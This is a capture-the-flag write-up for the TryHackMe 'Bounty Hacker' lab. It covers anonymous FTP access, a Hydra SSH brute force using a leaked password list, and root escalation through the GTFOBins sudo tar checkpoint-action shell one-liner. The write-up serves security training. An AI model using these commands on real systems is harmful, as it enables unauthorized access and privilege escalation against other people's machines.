# Bounty Hacker — TryHackMe Writeup

**Difficulty:** Easy ⭐  
**Operating System:** Linux (Ubuntu)  
**Category:** Enumeration + Brute Force + Privilege Escalation  

---

## Reconnaissance

### Setup /etc/hosts

Configure local hostname resolution:

![[Machines/TryHackMe/Bounty Hacker/Screenshots/etchosts.png]]

### Port Enumeration


![[Machines/TryHackMe/Bounty Hacker/Screenshots/nmap.png]]


**Open Ports:**

- **21/tcp** — FTP (vsFTPd 3.0.5) — **Anonymous login allowed**
- **22/tcp** — SSH (OpenSSH 8.2p1)
- **80/tcp** — HTTP (Apache 2.4.41) — Empty/placeholder

**Note:** FTP allowing anonymous access is a critical misconfiguration. Default settings should always be verified before deployment.

---

## FTP Enumeration

### Anonymous FTP Access


![[Machines/TryHackMe/Bounty Hacker/Screenshots/ftp.png]]


**Why This Works:** vsFTPd 3.0.5 has anonymous login enabled by default. The service doesn't require authentication to list and download files.

**Files Found:**

- `locks.txt` — Possible password list
- `task.txt` — Task notes

### File Download and Analysis

**locks.txt Content:**


![[lockstxt.png]]


**Analysis:** Appears to be a wordlist of passwords (hashed or plaintext format).

### task.txt Analysis


![[tasktxt.png]]


**Finding:** User `lin` is identified from the note signature. Combined with the password list, this provides entry point for SSH brute force.

---

## SSH Brute Force

### Identifying Possible Usernames

From web application and FTP analysis:

- `spike`
- `jet`
- `ed`
- `faye`
- `edward`
- `ein`
- `lin` (confirmed from task.txt)

**Note:** Without clear credentials, creating a userlist with all discovered names is standard reconnaissance practice. Hydra can efficiently test multiple username-password combinations.

### Creating Wordlists

**users.txt:**

```
spike
jet
ed
faye
edward
ein
lin
```

**passwords.txt:** (from locks.txt)

### SSH Brute Force Attack

```bash
hydra -L users.txt -P locks.txt ssh://bounty.lab -f -t 64
```

### Credentials Discovered

![[Machines/TryHackMe/Bounty Hacker/Screenshots/hydra.png]]


**Valid Credentials:** `lin:[REDACTED]`

**Why Hydra Works Here:** SSH accepts password authentication by default. Weak/reusable passwords in wordlists are common in CTF scenarios and real-world misconfigurations.

---

## Initial Access

### SSH Connection

```bash
ssh lin@bounty.lab
```

**Shell Obtained:** `lin@bounty.lab`

### Shell Upgrade


![[upgradetty.png]]

```bash
export TERM=xterm-256color
script -qc /bin/bash /dev/null
```

### User Flag Capture

![[usertxt.png]]


**Flag:** `THM{[REDACTED]}`

---

## Privilege Escalation

### Sudo Privileges Check

```bash
sudo -l
```

![[Machines/TryHackMe/Bounty Hacker/Screenshots/sudol.png]]

**Output:**

```
User lin may run the following commands on bounty.lab:
    (root) /bin/tar
```

**Critical Finding:** User `lin` can execute `/bin/tar` with root privileges without password.

**Why This Is Dangerous:** tar's `--checkpoint-action` parameter allows command execution. When combined with sudo, this grants root-level code execution.

### GTFObins Research


![[gtfobins.png]]

Reference: https://gtfobins.org/gtfobins/tar/

**Exploitation Method:**

```
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

This creates a tar archive with a checkpoint that triggers shell execution.

### Root Shell Execution


![[roottxt.png]]


**Result:** Root shell obtained via tar misconfiguration.

**Flag:** `THM{[REDACTED]}`

---

## Attack Chain Summary

|#|Stage|Method|Result|
|---|---|---|---|
|1|Reconnaissance|Nmap scan|3 services identified|
|2|FTP Enumeration|Anonymous access|2 files discovered|
|3|File Analysis|Manual inspection|Username `lin` extracted|
|4|Wordlist Creation|Manual enumeration|7 usernames + password list|
|5|SSH Brute Force|Hydra multi-user|Valid credentials obtained|
|6|Initial Access|SSH login|User shell achieved|
|7|Privilege Escalation|Sudo misconfiguration|Root shell obtained|
|8|Flag Capture|File reading|Both flags retrieved|

---

> Made by NonamesecX | For educational purposes only